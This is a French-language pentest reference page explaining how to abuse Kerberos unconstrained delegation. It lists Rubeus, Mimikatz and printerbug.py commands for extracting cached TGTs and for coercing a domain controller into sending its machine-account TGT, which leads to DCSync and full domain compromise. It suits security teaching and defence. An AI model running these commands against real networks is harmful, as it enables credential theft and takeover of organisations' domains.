---
title: "Délégation non contrainte : capturer des TGT"
description: "Abuser de la délégation non contrainte Kerberos en capturant les TGT que les hôtes de délégation stockent en mémoire, et le combiner à la coercition pour forcer un contrôleur de domaine à envoyer son propre TGT en vue de son extraction."
keywords:
  - délégation non contrainte
  - capture de TGT
  - TrustedForDelegation
  - printerbug
  - coercition
---

# Délégation non contrainte

Un hôte de confiance pour la **délégation non contrainte** reçoit une copie du **TGT** de chaque utilisateur qui s'y authentifie, et le met en cache dans LSASS afin de pouvoir agir en tant que cet utilisateur vers n'importe quel service. C'est là la vulnérabilité : compromettez un tel hôte et vous pouvez récolter les TGT de tous ceux qui se connectent, puis les réutiliser. Si vous pouvez faire se connecter un compte **privilégié**, vous capturez directement son TGT.

## Trouver et récolter

Les ordinateurs de délégation portent le flag UAC `TRUSTED_FOR_DELEGATION` (identifié durant l'[énumération](../../../dacl/acl-enumeration.md)). Sur un hôte de délégation compromis, extrayez les TGT mis en cache :

```bash
# Rubeus: watch for and extract TGTs as they arrive
Rubeus.exe monitor /interval:5 /nowrap
# Mimikatz
sekurlsa::tickets /export
```

## Forcer une connexion privilégiée

Attendre qu'un Domain Admin se connecte est lent. La **coercition** supprime l'attente : déclenchez une cible, idéalement un **contrôleur de domaine**, pour qu'elle s'authentifie auprès de votre hôte de délégation, et capturez le TGT qu'elle envoie :

```bash
# On the delegating host, listen for the incoming TGT
Rubeus.exe monitor /interval:1 /nowrap
# Coerce the DC to authenticate to the delegating host (PrinterBug/PetitPotam)
printerbug.py example.local/user:pass@<dc> <delegating-host>
```

Le DC s'authentifie avec son **compte machine**, vous capturez donc le TGT de `DC$`, que vous utilisez ensuite pour [DCSync](../../credentials/ntds-and-dcsync.md) et une compromission complète du domaine.

## Notes d'exploitation

- La chaîne coercition + délégation non contrainte transforme le contrôle d'un seul hôte de délégation en compromission du domaine, c'est pourquoi ces hôtes sont des cibles de grande valeur à repérer tôt.
- Les TGT capturés sont réutilisés via [pass-the-ticket](../pass-the-ticket.md) ; un TGT `DC$` permet le DCSync, un TGT d'utilisateur permet d'agir en tant que cet utilisateur.
- Les contrôleurs de domaine eux-mêmes sont de confiance pour la délégation non contrainte par défaut ; les hôtes membres portant le flag sont la configuration dangereuse.
- « Protected Users » et le flag de compte « sensible, ne peut pas être délégué » empêchent la capture du TGT d'une cible, de sorte que les comptes très privilégiés peuvent être hors de portée par cette voie.

## Outils

- **Rubeus** (`monitor`, `dump`) : capturer les TGT entrants sur l'hôte de délégation.
- **Coercer / printerbug.py / PetitPotam** : forcer un DC ou un serveur à s'authentifier.
- **Mimikatz** (`sekurlsa::tickets`) : extraire les TGT de délégation mis en cache.

## Références

- [Elad Shamir: Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [GhostPack Rubeus (monitor / dump)](https://github.com/GhostPack/Rubeus)
- [krbrelayx (dirkjanm): printerbug.py](https://github.com/dirkjanm/krbrelayx)
- [PetitPotam (topotam)](https://github.com/topotam/PetitPotam)
